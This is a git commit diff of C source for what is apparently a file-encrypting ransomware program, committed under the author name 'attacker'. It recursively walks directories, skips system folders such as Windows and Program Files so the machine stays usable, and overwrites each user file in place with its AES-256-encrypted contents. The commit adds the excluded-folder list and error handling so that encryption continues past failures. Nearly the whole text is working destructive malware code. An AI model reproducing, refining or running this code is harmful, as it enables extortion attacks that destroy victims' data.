4d2754aa4f37857c2759d2295d2ecfefa07e5f21
attacker <attacker@WIN10>
2025-03-05 10:03:25 +0100

    Handled spaces in directory && Error making program exit.

--- aesencrypt.c
+++ aesencrypt.c
@@ -11,19 +11,19 @@ unsigned char* AesEncrypt(int nothing, char* code, int code_len, char* key, size
     HCRYPTKEY hKey;
 
     if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
-        //printf("%s CryptAcquireContext failed with error: 0x%x\n", ERROR, GetLastError());
+        printf("%s CryptAcquireContext failed with error: 0x%x\n", ERROR, GetLastError());
         exit(1);
     }
     if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
-        //printf("%s CryptCreateHash failed with error: 0x%x\n", ERROR, GetLastError());
+        printf("%s CryptCreateHash failed with error: 0x%x\n", ERROR, GetLastError());
         exit(1);
     }
     if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
-        //printf("%s CryptHashData failed with error: 0x%x\n", ERROR, GetLastError());
+        printf("%s CryptHashData failed with error: 0x%x\n", ERROR, GetLastError());
         exit(1);
     }
     if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
-        //printf("%s CryptDeriveKey failed with error: 0x%x\n", ERROR, GetLastError());
+        printf("%s CryptDeriveKey failed with error: 0x%x\n", ERROR, GetLastError());
         exit(1);
     }
 
@@ -33,14 +33,14 @@ unsigned char* AesEncrypt(int nothing, char* code, int code_len, char* key, size
 
     unsigned char* encrypted_code = (unsigned char*)malloc(encrypted_len);
     if (encrypted_code == NULL) {
-        //printf("%s Memory allocation FOR encrypted code failed with error: 0x%x\n", ERROR, GetLastError());
+        printf("%s Memory allocation FOR encrypted code failed with error: 0x%x\n", ERROR, GetLastError());
         exit(1);
     }
 
     memcpy(encrypted_code, code, code_len);
 
     if (!CryptEncrypt(hKey, (HCRYPTHASH)NULL, 0, 0, encrypted_code, &encrypted_len, encrypted_len)) {
-        //printf("%s CryptDecrypt failed with error 0x%x\n", ERROR, GetLastError());
+        printf("%s CryptDecrypt failed with error 0x%x\n", ERROR, GetLastError());
         exit(1);
     }
 
@@ -48,7 +48,7 @@ unsigned char* AesEncrypt(int nothing, char* code, int code_len, char* key, size
     CryptDestroyHash(hHash);
     CryptDestroyKey(hKey);
 
-    //printf("%s Sucessfully encrypted the file\n", SUCCESS);
+    printf("%s Sucessfully encrypted the file\n", SUCCESS);
 
     return encrypted_code;
 }
--- main.c
+++ main.c
@@ -18,47 +18,61 @@ unsigned char* cEncryptedCode;
 
 BOOL SpiderDirectory(char* cDirectoryName, unsigned char* cEncryptedCode) {
     WIN32_FIND_DATA ffd;
-    LPCSTR lpPartialDirectory[MAX_PATH];
-    LPCSTR lpFullDirectory[MAX_PATH];
+    char lpPartialDirectory[MAX_PATH];
+    char lpFullDirectory[MAX_PATH];
     HANDLE hFind = INVALID_HANDLE_VALUE;
     LARGE_INTEGER filesize;
     long lEncryptedCodeSize;
     unsigned int code_len;
     long file_size = NULL;
+    char* cForbiddenDirectory[6] = { "Windows", "Program Files", "Program Files (x86)", "AppData", ".", ".."};
 
     //lEncryptedCodeSize = strlen(cEncryptedCode);
     StringCchCopy(lpPartialDirectory, MAX_PATH, cDirectoryName);
     sprintf(lpFullDirectory, "%s\\\\*", lpPartialDirectory);
 
-    //printf("%s Target directory is: %s\n", INFO, cDirectoryName);
+    printf("%s Target directory is: %s\n", INFO, cDirectoryName);
 
     hFind = FindFirstFileA(lpFullDirectory, &ffd);
     if (hFind == INVALID_HANDLE_VALUE) {
-        //printf("%s FindFirstFile failed with error: 0x%x\n", ERROR, GetLastError());
+        printf("%s FindFirstFile failed with error: 0x%x\n", ERROR, GetLastError());
     }
     do {
         if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) {
-                continue;
+         
+            BOOL isForbidden = FALSE;
+            for (int i = 0; i < 6; i++) {
+                if (strcmp(ffd.cFileName, cForbiddenDirectory[i]) == 0) {
+                    isForbidden = TRUE;
+                    break;
+                }
             }
+            if (isForbidden) continue;
+  
             sprintf(lpFullDirectory, "%s\\%s", lpPartialDirectory, ffd.cFileName);
-            //printf("%s   <DIR>\n", lpFullDirectory);
+            printf("%s   <DIR>\n", lpFullDirectory);
             SpiderDirectory(lpFullDirectory, cEncryptedCode);
         }
         else {
             filesize.LowPart = ffd.nFileSizeLow;
             filesize.HighPart = ffd.nFileSizeHigh;
-            //printf("%s   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
+            printf("%s   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
             sprintf(lpFullDirectory, "%s\\%s", lpPartialDirectory, ffd.cFileName);
 
             cEncryptedCode = LoadFile(lpFullDirectory, &file_size);
+            if (!cEncryptedCode) {
+                continue;
+            }
             code_len = file_size;
-            //printf("%s\n", cEncryptedCode);
+            printf("%s\n", cEncryptedCode);
             cEncryptedCode = AesEncrypt(0, cEncryptedCode, code_len, key, sizeof(key));
             lEncryptedCodeSize = filesize.QuadPart;
-            WriteToFile(lpFullDirectory, cEncryptedCode, lEncryptedCodeSize);
+            if (!WriteToFile(lpFullDirectory, cEncryptedCode, lEncryptedCodeSize)) {
+                continue;
+            }
         }
     } while (FindNextFileA(hFind, &ffd) != 0);
+    FindClose(hFind);
 }
 
 unsigned char* PadData(unsigned char* data, DWORD* data_len) {
@@ -68,7 +82,7 @@ unsigned char* PadData(unsigned char* data, DWORD* data_len) {
     *data_len += pad_len;
     unsigned char* padded_data = (unsigned char*)malloc(*data_len);
     if (padded_data == NULL) {
-        //printf("Memory allocation for padding failed with error: 0x%x\n", ERROR, GetLastError());
+        printf("Memory allocation for padding failed with error: 0x%x\n", ERROR, GetLastError());
         exit(1);
     }
 
@@ -83,17 +97,18 @@ unsigned char* PadData(unsigned char* data, DWORD* data_len) {
 BOOL WriteToFile(LPCSTR lpFileName, unsigned char* cEncryptedCode, long lEncryptedCodeSize) {
     HANDLE hEncryptedFile = NULL;
 
-    //printf("%s filename: '%s'\n", INFO, lpFileName);
+    printf("%s filename: '%s'\n", INFO, lpFileName);
     hEncryptedFile = CreateFileA(lpFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hEncryptedFile == INVALID_HANDLE_VALUE) {
-        //printf("%s CreateFile failed with error: 0x%x\n", ERROR, GetLastError());
-        return -1;
+    if (hEncryptedFile == INVALID_HANDLE_VALUE || !hEncryptedFile || !lEncryptedCodeSize) {
+        printf("%s CreateFile failed with error: 0x%x\n", ERROR, GetLastError());
+        return 1;
     }
 
     DWORD dwBytesWritten;
-    //printf("%s filesize: %d\n", INFO, lEncryptedCodeSize);
-    if (!WriteFile(hEncryptedFile, cEncryptedCode, lEncryptedCodeSize, &dwBytesWritten, NULL)) {
-        //printf("%s WriteFile failed with error: 0x%x\n", ERROR, GetLastError());
+    printf("%s filesize: %d\n", INFO, lEncryptedCodeSize);
+    BOOL bResult = WriteFile(hEncryptedFile, cEncryptedCode, lEncryptedCodeSize, &dwBytesWritten, NULL);
+    if (!bResult || !dwBytesWritten || !lEncryptedCodeSize) {
+        printf("%s WriteFile failed with error: 0x%x\n", ERROR, GetLastError());
         return 1;
     }
 }
